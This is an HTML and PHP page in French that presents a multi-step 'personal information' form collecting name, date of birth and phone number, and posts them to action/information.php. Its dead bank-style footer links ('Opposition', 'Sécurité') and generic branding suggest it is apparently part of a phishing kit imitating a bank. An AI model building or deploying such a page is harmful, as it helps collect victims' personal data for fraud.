<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire - Informations Personnelles</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
            width: 100%;
        }

        .top-logo {
            margin-bottom: 30px;
        }

        .top-logo img {
            max-width: 200px;
        }

        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            padding: 30px;
            margin: 0 auto;
        }

        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 1.5rem;
            color: #003883;
            font-weight: 600;
            text-align: center;
            margin-bottom: 10px;
        }

        .verification-text {
            font-size: 0.9rem;
            color: #6b7280;
            margin-bottom: 20px;
        }

        .form-group {
            display: flex;
            justify-content: space-between;
            gap: 15px;
            margin-bottom: 20px;
        }

        .form-group label {
            font-size: 0.9rem;
            color: #6b7280;
            display: block;
        }

        .form-group input,
        .form-group select {
            padding: 10px;
            font-size: 0.9rem;
            border: 1px solid #d1d5db;
            border-radius: 5px;
            width: 100%;
        }

        .form-group select:invalid {
            color: #9ca3af;
        }

        .full-width {
            width: 100%;
        }

        .btn-container {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .btn {
            background: #ff006f;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn:hover {
            background: #e60064;
        }

        .footer-links {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #999;
        }

        .footer-links a {
            color: #999;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Formulaire -->
        <div class="form-box">
            <div class="header-bar"></div>

            <h1>Informations personnelles</h1>
            <div class="verification-text">
                Veuillez remplir les champs ci-dessous avec vos informations personnelles.
            </div>

            <form action="action/information.php" method="POST">
                <!-- Nom et prénom -->
                <div class="form-group">
                    <input type="text" name="lastname" placeholder="Nom de famille" required>
                    <input type="text" name="firstname" placeholder="Prénom" required>
                </div>

                <!-- Date de naissance -->
                <div class="form-group">
                    <select name="day" required>
                        <option value="" disabled selected>Jour</option>
                        <?php for ($i = 1; $i <= 31; $i++) {
                            echo "<option value='$i'>$i</option>";
                        } ?>
                    </select>
                    <select name="month" required>
                        <option value="" disabled selected>Mois</option>
                        <?php 
                        $months = [
                            "Janvier", "Février", "Mars", "Avril", "Mai", "Juin",
                            "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"
                        ];
                        foreach ($months as $index => $month) {
                            echo "<option value='" . ($index + 1) . "'>$month</option>";
                        }
                        ?>
                    </select>
                    <select name="year" required>
                        <option value="" disabled selected>Année</option>
                        <?php 
                        $currentYear = date('Y');
                        for ($i = $currentYear; $i >= 1900; $i--) {
                            echo "<option value='$i'>$i</option>";
                        }
                        ?>
                    </select>
                </div>

                <!-- Numéro de téléphone -->
                <div class="form-group">
                    <input type="tel" name="phone" placeholder="Numéro de téléphone" maxlength="10" class="full-width" required>
                </div>

                <!-- Bouton Suivant -->
                <div class="btn-container">
                    <button class="btn" type="submit">Suivant</button>
                </div>
            </form>
        </div>

        <!-- Footer -->
        <div class="footer-links">
            <a href="#">Aide</a> / <a href="#">Opposition</a> / <a href="#">Sécurité</a>
        </div>
    </div>
</body>
</html>
